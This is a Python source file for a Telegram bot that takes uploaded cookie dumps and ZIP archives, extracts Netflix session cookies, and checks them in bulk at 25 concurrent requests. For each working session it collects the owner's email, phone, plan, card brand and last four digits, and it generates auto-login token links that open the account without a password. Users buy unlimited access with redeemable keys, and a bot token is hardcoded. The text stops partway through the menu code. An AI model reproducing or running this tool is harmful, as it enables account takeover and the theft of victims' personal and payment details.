# netflix_bot_universal_fixed.py
# pip install aiogram aiohttp aiofiles aiosqlite requests

import asyncio
import aiofiles
import aiosqlite
import re
import json
import time
import os
import io
import zipfile
import string
import secrets
import threading
import requests
import urllib3
import urllib.parse
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, List, Dict, Tuple
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed

from aiogram import Bot, Dispatcher, F, types
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command
from aiogram.enums import ParseMode, ChatAction
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ============ CONFIG ============
BOT_TOKEN = "8863987992:AAH9derBQwwwTz41lk7AjWlD2UY3F8TI4KU"
ADMIN_IDS = [1368474690]

FREE_DAILY_LIMIT = 500
MAX_FILE_SIZE = 100 * 1024 * 1024
CONCURRENT_CHECKS = 25

DB_PATH = "netflix_bot.db"
TEMP_DIR = Path("temp")
TEMP_DIR.mkdir(exist_ok=True)

check_storage = {}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ STATES ============
class UserStates(StatesGroup):
    waiting_for_cookie_input = State()
    waiting_for_key_redemption = State()

# ============ DATABASE ============
class Database:
    def __init__(self, db_path: str):
        self.db_path = db_path
    
    async def init(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    joined_date TEXT,
                    is_admin INTEGER DEFAULT 0,
                    daily_used INTEGER DEFAULT 0,
                    last_check_date TEXT,
                    unlimited_until TEXT,
                    total_checked INTEGER DEFAULT 0,
                    total_hits INTEGER DEFAULT 0
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS keys (
                    key_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    key_code TEXT UNIQUE,
                    days INTEGER,
                    created_by INTEGER,
                    created_date TEXT,
                    redeemed_by INTEGER,
                    redeemed_date TEXT,
                    is_used INTEGER DEFAULT 0
                )
            """)
            await db.commit()
    
    async def get_user(self, user_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            row = await cursor.fetchone()
            if row:
                return {
                    "user_id": row[0], "username": row[1], "first_name": row[2],
                    "joined_date": row[3], "is_admin": bool(row[4]),
                    "daily_used": row[5], "last_check_date": row[6],
                    "unlimited_until": row[7], "total_checked": row[8], "total_hits": row[9]
                }
            return None
    
    async def create_user(self, user_id: int, username: str, first_name: str):
        is_admin = 1 if user_id in ADMIN_IDS else 0
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                """INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date, is_admin) 
                   VALUES (?, ?, ?, ?, ?)""",
                (user_id, username, first_name, datetime.now().isoformat(), is_admin)
            )
            await db.commit()
    
    async def can_check(self, user_id: int, amount: int = 1) -> Tuple[bool, int, int]:
        user = await self.get_user(user_id)  # <-- FIXED: Changed db.get_user to self.get_user
        if not user:
            return False, 0, 0
        
        if user["is_admin"]:
            return True, -1, -1
        
        if user["unlimited_until"]:
            unlimited_date = datetime.fromisoformat(user["unlimited_until"])
            if unlimited_date > datetime.now():
                return True, -1, -1
        
        today = datetime.now().strftime("%Y-%m-%d")
        if user["last_check_date"] != today:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    "UPDATE users SET daily_used = 0, last_check_date = ? WHERE user_id = ?",
                    (today, user_id)
                )
                await db.commit()
            user["daily_used"] = 0
        
        remaining = FREE_DAILY_LIMIT - user["daily_used"]
        return remaining >= amount, FREE_DAILY_LIMIT, remaining
    
    async def increment_usage(self, user_id: int, amount: int = 1, hits: int = 0):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                """UPDATE users SET daily_used = daily_used + ?, 
                   total_checked = total_checked + ?, total_hits = total_hits + ?
                   WHERE user_id = ?""",
                (amount, amount, hits, user_id)
            )
            await db.commit()
    
    async def create_key(self, days: int, created_by: int) -> str:
        key_code = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "INSERT INTO keys (key_code, days, created_by, created_date) VALUES (?, ?, ?, ?)",
                (key_code, days, created_by, datetime.now().isoformat())
            )
            await db.commit()
        return key_code
    
    async def redeem_key(self, key_code: str, user_id: int) -> Optional[int]:
        key_code = key_code.upper().replace(" ", "").replace("-", "")
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT * FROM keys WHERE key_code = ? AND is_used = 0", (key_code,)
            )
            row = await cursor.fetchone()
            if not row:
                return None
            
            days = row[2]
            unlimited_until = datetime.now() + timedelta(days=days)
            
            await db.execute(
                "UPDATE keys SET redeemed_by = ?, redeemed_date = ?, is_used = 1 WHERE key_code = ?",
                (user_id, datetime.now().isoformat(), key_code)
            )
            await db.execute(
                "UPDATE users SET unlimited_until = ? WHERE user_id = ?",
                (unlimited_until.isoformat(), user_id)
            )
            await db.commit()
            return days

# Initialize db after class definition
db = Database(DB_PATH)

# ============ NETFLIX CHECKER ============
COUNTRY_FLAGS = {
    "US": "🇺🇸", "GB": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷", "ES": "🇪🇸", "IT": "🇮🇹",
    "TR": "🇹🇷", "BR": "🇧🇷", "JP": "🇯🇵", "KR": "🇰🇷", "IN": "🇮🇳", "CA": "🇨🇦",
    "AU": "🇦🇺", "MX": "🇲🇽", "NL": "🇳🇱", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰",
    "FI": "🇫🇮", "PL": "🇵🇱", "RU": "🇷🇺", "AR": "🇦🇷", "CL": "🇨🇱", "CO": "🇨🇴",
    "PE": "🇵🇪", "AE": "🇦🇪", "SA": "🇸🇦", "EG": "🇪🇬", "ZA": "🇿🇦", "ID": "🇮🇩",
    "MY": "🇲🇾", "SG": "🇸🇬", "TH": "🇹🇭", "VN": "🇻🇳", "PH": "🇵🇭", "KE": "🇰🇪",
    "NG": "🇳🇬", "GH": "🇬🇭", "PT": "🇵🇹", "RO": "🇷🇴", "HU": "🇭🇺", "CZ": "🇨🇿",
    "UA": "🇺🇦", "AT": "🇦🇹", "CH": "🇨🇭", "BE": "🇧🇪", "IL": "🇮🇱", "TW": "🇹🇼",
    "HK": "🇭🇰", "PK": "🇵🇰", "NZ": "🇳🇿", "SK": "🇸🇰", "HR": "🇭🇷", "RS": "🇷🇸", "BG": "🇧🇬",
}

COUNTRY_NAMES = {
    "US": "United States", "GB": "United Kingdom", "DE": "Germany", "FR": "France",
    "ES": "Spain", "IT": "Italy", "TR": "Turkey", "BR": "Brazil", "JP": "Japan",
    "KR": "South Korea", "IN": "India", "CA": "Canada", "AU": "Australia", "MX": "Mexico",
    "NL": "Netherlands", "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland",
    "PL": "Poland", "RU": "Russia", "AR": "Argentina", "CL": "Chile", "CO": "Colombia",
    "PE": "Peru", "AE": "UAE", "SA": "Saudi Arabia", "EG": "Egypt", "ZA": "South Africa",
    "ID": "Indonesia", "MY": "Malaysia", "SG": "Singapore", "TH": "Thailand", "VN": "Vietnam",
    "PH": "Philippines", "KE": "Kenya", "NG": "Nigeria", "GH": "Ghana", "PT": "Portugal",
    "RO": "Romania", "HU": "Hungary", "CZ": "Czech Republic", "UA": "Ukraine",
    "AT": "Austria", "CH": "Switzerland", "BE": "Belgium", "IL": "Israel", "TW": "Taiwan",
    "HK": "Hong Kong", "PK": "Pakistan", "NZ": "New Zealand", "SK": "Slovakia",
    "HR": "Croatia", "RS": "Serbia", "BG": "Bulgaria",
}

UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

def _djs(s):
    if not s:
        return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def _flag(cc):
    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")

def _country(cc):
    return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")

def parse_netscape(text):
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = urllib.parse.unquote(parts[6])
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {c["name"]: urllib.parse.unquote(c["value"]) for c in data if "name" in c and "value" in c}
        if isinstance(data, dict):
            return {k: urllib.parse.unquote(v) for k, v in data.items()}
    except Exception:
        pass
    return {}

def load_cookies(text):
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        c = parse_json_cookies(text)
        if c:
            return c
    c = parse_netscape(text)
    if c:
        return c
    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k, v = k.strip(), v.strip()
            if k:
                cookies[k] = urllib.parse.unquote(v)
    return cookies

# ============ MOBILE APP LINK GENERATION ============
def generate_mobile_app_link(cookies: dict, nftoken: str = None) -> str:
    """
    Generate Netflix mobile app deep link with nftoken
    Format: https://www.netflix.com/app?redirect=true&referrer=oauth_2_via_browser%3Dtrue&nftoken=...
    """
    if not nftoken:
        return None
    
    # URL encode the token properly
    encoded_token = urllib.parse.quote(nftoken, safe="")
    
    # Construct the mobile app link
    mobile_link = (
        f"https://www.netflix.com/app?"
        f"redirect=true&"
        f"referrer=oauth_2_via_browser%3Dtrue&"
        f"nftoken={encoded_token}"
    )
    
    return mobile_link

# ============ NFTOKEN GENERATION ============
_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
_IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
    """Generate NFT token"""
    if not netflix_id_raw:
        return None

    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    proxies = {"http": proxy, "https": proxy} if proxy else None

    headers = dict(_IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            _IOS_API,
            params=_IOS_PARAMS,
            headers=headers,
            proxies=proxies,
            timeout=timeout,
            verify=False,
        )
        if r.status_code == 200:
            data = r.json()
            token_data = (
                (((data.get("value") or {}).get("account") or {})
                 .get("token") or {})
                .get("default") or {}
            )
            tok = token_data.get("token")
            if tok:
                return str(tok)
    except Exception:
        pass

    try:
        sess2 = requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        if proxies:
            sess2.proxies = proxies
            sess2.verify = False
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {
                "persistedQuery": {
                    "version": 102,
                    "id": "76e97129-f4b5-41a0-a73c-12e674896849",
                }
            },
        }
        r2 = sess2.post(
            "https://android13.prod.ftl.netflix.com/graphql",
            json=payload,
            headers={
                "User-Agent": UA_ANDROID,
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            timeout=timeout,
        )
        if r2.status_code == 200:
            d = r2.json()
            tok = (d.get("data") or {}).get("createAutoLoginToken")
            if tok:
                return str(tok)
    except Exception:
        pass

    return None


def normalize_plan_key(plan_name):
    """Normalize plan name for comparison"""
    if not plan_name:
        return "unknown"
    import unicodedata
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"


def extract_info_from_graphql_payload(response_text):
    """Extract account info from GraphQL payload - ENHANCED for hold detection"""
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}

    if not isinstance(payload, dict):
        return {}

    data = payload.get("data")
    if not isinstance(data, dict):
        return {}

    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    
    # Extract hold status from multiple sources
    hold_status = None
    
    # Check hold metadata
    if isinstance(hold_meta, dict):
        for key in ["isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue"]:
            val = hold_meta.get(key)
            if val is not None:
                if isinstance(val, bool):
                    hold_status = "Yes" if val else "No"
                elif isinstance(val, str):
                    hold_status = "Yes" if val.lower() in ("true", "yes", "on_hold", "paused") else "No"
                break
    
    # Check growth account directly
    if hold_status is None:
        for key in ["isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue"]:
            val = growth_account.get(key)
            if val is not None:
                if isinstance(val, bool):
                    hold_status = "Yes" if val else "No"
                elif isinstance(val, str):
                    hold_status = "Yes" if val.lower() in ("true", "yes", "on_hold", "paused") else "No"
                break
    
    # Check membership status for hold indicators
    membership_status = growth_account.get("membershipStatus")
    if hold_status is None and membership_status:
        ms_lower = str(membership_status).lower()
        if any(token in ms_lower for token in ["hold", "past_due", "payment_retry", "paused", "suspend", "inactive"]):
            hold_status = "Yes"
        elif ms_lower == "current_member":
            hold_status = "No"
    
    info = {
        "accountOwnerName": _djs(current_profile.get("name")),
        "email": _djs((current_profile.get("growthEmail") or {}).get("email", {}).get("value")),
        "countryOfSignup": _djs(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": _djs(growth_account.get("memberSince")),
        "nextBillingDate": _djs(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": _djs(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "membershipStatus": _djs(membership_status),
        "localizedPlanName": _djs(current_plan.get("name") or next_plan.get("name")),
        "videoQuality": _djs(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
    }
    
    return {k: v for k, v in info.items() if v not in (None, "", [], {})}


def check_account(cookies: dict, timeout=20, proxy=None):
    """Check Netflix account - ENHANCED hold detection with Spanish and payment patterns"""
    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
        return None

    sess = requests.Session()
    sess.headers.update({
        "User-Agent": UA_WEB,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "DNT": "1",
    })
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
        sess.verify = False

    try:
        r = sess.get(
            "https://www.netflix.com/account",
            allow_redirects=True,
            timeout=timeout,
        )
    except requests.RequestException:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text

    # ========== ENHANCED HOLD DETECTION ==========
    # Collect all membership statuses from HTML
    all_statuses = set()
    
    # Find all membershipStatus values in raw HTML
    matches = re.findall(r'"membershipStatus"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
    all_statuses.update(m.upper() for m in matches)
    
    # Also check in script JSON objects for more complete data
    script_pattern = r'<script[^>]*>(.*?)</script>'
    scripts = re.findall(script_pattern, html, re.DOTALL | re.IGNORECASE)
    graphql_data = {}
    
    for script in scripts:
        for var_name in ['__INITIAL_STATE__', '__NETFLIX__', '__APOLLO_STATE__']:
            pattern = rf'window\.{var_name}\s*=\s*(\{{.*?\}});'
            match = re.search(pattern, script, re.DOTALL)
            if match:
                try:
                    data = json.loads(match.group(1))
                    graphql_data = data
                    data_str = json.dumps(data)
                    json_matches = re.findall(r'"membershipStatus"\s*:\s*"([^"]+)"', data_str, re.IGNORECASE)
                    all_statuses.update(m.upper() for m in json_matches)
                except:
                    pass
    
    # Extract info from GraphQL payload for holdStatus field
    graphql_info = extract_info_from_graphql_payload(json.dumps(graphql_data)) if graphql_data else {}
    
    # ========== EXPANDED HOLD FLAGS DETECTION ==========
    # Primary hold boolean flags
    hold_flags = [
        '"isOnHold":true',
        '"accountOnHold":true', 
        '"holdStatus":"ON_HOLD"',
        '"holdStatus":"PAUSED"',
        '"holdStatus":"HOLD"',
        '"membershipPaused":true',
        '"accountPaused":true',
        '"reactivateMembership":true',
        '"isUserOnHold":true',
        '"pastDue":true',
        '"isPastDue":true',
        '"paymentRetry":true',
        '"isInPaymentRetry":true',
    ]
    
    # Spanish hold patterns (common on Latin American accounts)
    spanish_hold_patterns = [
        "membresía está en pausa",
        "membresia esta en pausa",
        "cuenta en pausa",
        "suscripción pausada",
        "suscripcion pausada",
        "agrega tu información de pago",
        "agrega tu informacion de pago",
        "actualiza tu método de pago",
        "actualiza tu metodo de pago",
        "pago rechazado",
        "error en el pago",
        "reactivar membresía",
        "reactivar membresia",
        "tu suscripción está pausada",
        "tu suscripcion esta pausada",
    ]
    
    # Payment-related hold indicators
    payment_hold_patterns = [
        "past_due",
        "payment_retry",
        "payment_required",
        "payment_failed",
        "billing_issue",
        "update_payment",
        "payment_method_required",
    ]
    
    # Check for hold flags
    hold_flags_found = any(flag in html for flag in hold_flags)
    spanish_hold_found = any(pattern in html.lower() for pattern in spanish_hold_patterns)
    payment_hold_found = any(pattern in html.lower() for pattern in payment_hold_patterns)
    
    # Check holdStatus from GraphQL data
    hold_status_from_graphql = graphql_info.get("holdStatus")
    
    # ========== CLASSIFICATION: HOLD WINS CONFLICTS ==========
    hold_states = {"HOLD", "PAUSED", "SUSPENDED", "INACTIVE", "PAST_DUE", "PAYMENT_RETRY"}
    
    # Determine hold status - priority order
    is_hold = False
    status = "unknown"
    
    # Priority 1: Explicit hold status from GraphQL
    if hold_status_from_graphql == "Yes":
        is_hold = True
        status = "hold"
    # Priority 2: Hold states in membership status
    elif all_statuses & hold_states:
        is_hold = True
        status = "hold"
    # Priority 3: Hold boolean flags
    elif hold_flags_found:
        is_hold = True
        status = "hold"
    # Priority 4: Spanish hold patterns
    elif spanish_hold_found:
        is_hold = True
        status = "hold"
    # Priority 5: Payment hold patterns
    elif payment_hold_found:
        is_hold = True
        status = "hold"
    # Priority 6: Current member (not on hold)
    elif "CURRENT_MEMBER" in all_statuses:
        is_hold = False
        status = "valid"
    # Priority 7: Any other status found
    elif all_statuses:
        status = "unknown"
        is_hold = False
    else:
        # No membership info found
        return None

    # Determine if subscribed (current member or on hold with valid subscription)
    is_member = "CURRENT_MEMBER" in all_statuses or is_hold

    # ========== EXTRACT ACCOUNT INFO ==========
    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
    if not name:
        name = _djs(_rx(r'"firstName":"([^"]+)"', html))
    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
    if not since:
        ts_raw = _rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if ts_raw and ts_raw.isdigit():
            try:
                since = datetime.utcfromtimestamp(int(ts_raw) / 1000).strftime("%B %Y")
            except Exception:
                since = "N/A"
    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
    quality_map = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}
    quality = quality_map.get(q_raw, q_raw or "N/A")
    streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
    _pm_start = html.find('"paymentMethods"')
    pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
    if not card_brand:
        card_brand = _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
    if not card_last4:
        card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
    pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
    phone_verified = pv_raw == "true"
    extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
    extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
    can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
    free_trial = '"isInFreeTrial":true' in html
    profiles = [_djs(p) for p in re.findall(r'"profileName":"([^"]+)"', html)]
    if not profiles:
        profiles = [_djs(p) for p in re.findall(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
    seen = set()
    profiles_clean = []
    for p in profiles:
        if p and p not in seen:
            seen.add(p)
            profiles_clean.append(p)
    user_guid = _rx(r'"userGuid":"([^"]+)"', html)
    netflix_id_raw = cookies.get("NetflixId", "")
    tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
    if tok:
        tok_safe = urllib.parse.quote(tok, safe="")
        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
        mobile_app_link = generate_mobile_app_link(cookies, tok)
    else:
        login_pc = "N/A"
        login_phone = "N/A"
        mobile_app_link = "N/A"
    login_tv = "https://www.netflix.com/tv2"
    display_name = name or (profiles_clean[0] if profiles_clean else "N/A")

    return {
        "email": email or "N/A",
        "name": display_name,
        "country_code": cc,
        "country": _country(cc),
        "plan": plan or "N/A",
        "plan_id": plan_id or "N/A",
        "price": price or "N/A",
        "member_since": since or "N/A",
        "next_billing": nextbill or "N/A",
        "free_trial": free_trial,
        "can_change": can_change,
        "video_quality": quality,
        "max_streams": str(streams),
        "extra_slots": extra_slots,
        "card_brand": card_brand or "N/A",
        "card_last4": card_last4 or "N/A",
        "payment_method": pay_type or "N/A",
        "phone": phone,
        "phone_verified": phone_verified,
        "profiles": profiles_clean,
        "profile_count": len(profiles_clean),
        "user_guid": user_guid or "N/A",
        "netflix_id_raw": netflix_id_raw,
        "login_pc": login_pc,
        "login_phone": login_phone,
        "login_tv": login_tv,
        "mobile_app_link": mobile_app_link,
        "status": status,
        "is_hold": is_hold,
        "is_member": is_member,
    }
# ============ UNIVERSAL COOKIE EXTRACTOR ============
class CookieExtractor:
    @staticmethod
    def extract_from_text(text: str, filename: str = "unknown") -> List[Dict]:
        """
        UNIVERSAL extractor - finds NetflixId in ANY format
        Just looks for NetflixId= and extracts everything until delimiter
        """
        found = []
        
        # Pattern 1: NetflixId= followed by any characters until ; or newline or "
        # This handles: NetflixId=v=3&ct=..., NetflixId=abc123, NetflixId=ct=..., etc.
        pattern = r'NetflixId=([^;\s"]+)'
        matches = re.findall(pattern, text, re.IGNORECASE)
        
        for m in matches:
            # m is just the value, reconstruct full cookie
            cookie_value = m.strip()
            if cookie_value:
                # Check if SecureNetflixId also exists
                secure_match = re.search(r'SecureNetflixId=([^;\s"]+)', text, re.IGNORECASE)
                if secure_match:
                    full_cookie = f"NetflixId={cookie_value}; SecureNetflixId={secure_match.group(1).strip()}"
                else:
                    full_cookie = f"NetflixId={cookie_value}"
                
                # Avoid duplicates
                if not any(f['cookie'] == full_cookie for f in found):
                    found.append({
                        'cookie': full_cookie,
                        'type': 'universal',
                        'source': filename,
                        'raw': full_cookie
                    })
        
        # Pattern 2: JSON format {"name":"NetflixId","value":"..."}
        json_pattern = r'"name"\s*:\s*"NetflixId"\s*,\s*"value"\s*:\s*"([^"]+)"'
        json_matches = re.findall(json_pattern, text, re.IGNORECASE)
        for m in json_matches:
            if m and not any(f['cookie'] == f"NetflixId={m}" for f in found):
                found.append({
                    'cookie': f"NetflixId={m}",
                    'type': 'json',
                    'source': filename,
                    'raw': f"NetflixId={m}"
                })
        
        # Pattern 3: Netscape format (tab separated)
        lines = text.split('\n')
        for line in lines:
            if '\t' in line:
                parts = line.strip().split('\t')
                if len(parts) >= 7:
                    name = parts[5].strip()
                    value = parts[6].strip()
                    if name.lower() == 'netflixid':
                        cookie_str = f"NetflixId={urllib.parse.unquote(value)}"
                        # Check for SecureNetflixId in same file
                        secure_id = None
                        for l in lines:
                            if '\t' in l:
                                p = l.strip().split('\t')
                                if len(p) >= 7 and p[5].strip().lower() == 'securenetflixid':
                                    secure_id = p[6].strip()
                                    break
                        if secure_id:
                            cookie_str += f"; SecureNetflixId={urllib.parse.unquote(secure_id)}"
                        
                        if not any(f['cookie'] == cookie_str for f in found):
                            found.append({
                                'cookie': cookie_str,
                                'type': 'netscape',
                                'source': filename,
                                'raw': cookie_str
                            })
        
        # Remove duplicates by cookie value
        seen = set()
        unique = []
        for c in found:
            if c['cookie'] not in seen:
                seen.add(c['cookie'])
                unique.append(c)
        
        return unique
    
    @staticmethod
    def extract_from_zip(data: bytes) -> List[Dict]:
        """
        Extract from ZIP - recursively scan ALL files
        """
        all_cookies = []
        try:
            with zipfile.ZipFile(BytesIO(data)) as zf:
                for item in zf.namelist():
                    # Skip directories and non-text files
                    if item.endswith('/') or item.endswith(('.jpg', '.png', '.gif', '.mp4', '.zip')):
                        continue
                    
                    try:
                        # Try to read as text
                        content = zf.read(item).decode('utf-8', errors='ignore')
                        if content.strip() and len(content) < 10 * 1024 * 1024:  # Skip files > 10MB
                            cookies = CookieExtractor.extract_from_text(content, item)
                            if cookies:
                                all_cookies.extend(cookies)
                    except Exception as e:
                        print(f"Error reading {item}: {e}")
                        continue
        except Exception as e:
            print(f"ZIP error: {e}")
        
        return all_cookies

# ============ BOT SETUP ============
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

# ============ KEYBOARDS ============
def main_menu(user_id: int = 0):
    is_admin = user_id in ADMIN_IDS
    buttons = [
        [InlineKeyboardButton(text="📤 Upload File", callback_data="upload_file")],
        [InlineKeyboardButton(text="📝 Paste Cookie", callback_data="paste_cookie")],
        [InlineKeyboardButton(text="🔑 Redeem Key", callback_data="redeem_key")],
        [InlineKeyboardButton(text="📊 My Stats", callback_data="my_stats")],
    ]
    if is_admin:
